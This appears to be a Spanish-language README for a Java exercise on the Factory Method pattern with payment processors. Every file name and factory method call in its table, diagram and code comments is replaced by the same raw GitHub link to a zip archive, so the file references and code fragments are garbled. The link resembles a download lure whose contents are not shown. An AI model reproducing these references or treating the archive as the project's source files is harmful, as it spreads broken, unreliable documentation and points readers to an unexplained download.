# Sistema de Pagos — Patrón Factory Method

## Problema que resuelve

El código original usaba `if/else` encadenados para decidir cómo procesar cada pago. Agregar un nuevo método significaba modificar la lógica central, rompiendo el principio Open/Closed.

## Qué implementa cada archivo

| Archivo | Rol en el patrón | Qué es |
|---|---|---|
| `https://github.com/Edwinramirezgon/Reto-Factory/raw/refs/heads/main/java/Reto-Factory-v2.4.zip` | **Producto abstracto** | Interfaz con el contrato `process(amount)` que todo procesador debe cumplir |
| `https://github.com/Edwinramirezgon/Reto-Factory/raw/refs/heads/main/java/Reto-Factory-v2.4.zip` | **Productos concretos** | `CreditCardProcessor`, `PayPalProcessor`, `BankTransferProcessor` — cada uno con su lógica propia |
| `https://github.com/Edwinramirezgon/Reto-Factory/raw/refs/heads/main/java/Reto-Factory-v2.4.zip` | **La fábrica** | Clase con el método estático `create(method)` que decide qué procesador instanciar |
| `https://github.com/Edwinramirezgon/Reto-Factory/raw/refs/heads/main/java/Reto-Factory-v2.4.zip` | **Cliente** | GUI Swing que llama a `https://github.com/Edwinramirezgon/Reto-Factory/raw/refs/heads/main/java/Reto-Factory-v2.4.zip()` sin conocer qué clase concreta se usa |

## Cómo se relacionan

```
Main (cliente)
    │
    └──▶ https://github.com/Edwinramirezgon/Reto-Factory/raw/refs/heads/main/java/Reto-Factory-v2.4.zip("Credit Card")
                │
                └──▶ new CreditCardProcessor()  ──▶ implements PaymentProcessor
                     new PayPalProcessor()       ──▶ implements PaymentProcessor
                     new BankTransferProcessor() ──▶ implements PaymentProcessor
```

## Por qué cumple Factory Method

1. **Un solo punto de creación**: `https://github.com/Edwinramirezgon/Reto-Factory/raw/refs/heads/main/java/Reto-Factory-v2.4.zip()` es el único lugar donde se instancian procesadores. El cliente nunca usa `new` directamente.
2. **Producto abstracto**: `Main` solo conoce `PaymentProcessor`. No sabe si está usando `CreditCardProcessor` o cualquier otro.
3. **Abierto/Cerrado**: agregar un nuevo método de pago = añadir una clase + un `case` en la fábrica. La lógica del cliente (`Main`) no cambia.
4. **Centralización**: toda la lógica de qué clase crear vive en un solo lugar, eliminando los `if/else` dispersos del código original.

## Cómo agregar un nuevo método de pago

```java
// 1. Nuevo procesador en https://github.com/Edwinramirezgon/Reto-Factory/raw/refs/heads/main/java/Reto-Factory-v2.4.zip
class CryptoProcessor implements PaymentProcessor {
    public void process(double amount) { ... }
}

// 2. Nuevo case en https://github.com/Edwinramirezgon/Reto-Factory/raw/refs/heads/main/java/Reto-Factory-v2.4.zip
case "Crypto" -> new CryptoProcessor();

// 3. Agregar al array en https://github.com/Edwinramirezgon/Reto-Factory/raw/refs/heads/main/java/Reto-Factory-v2.4.zip
private static final String[] METHODS = {"Credit Card", "PayPal", "Bank Transfer", "Crypto"};
```

## Cómo ejecutar

```bash
cd java
javac *.java
java Main
```
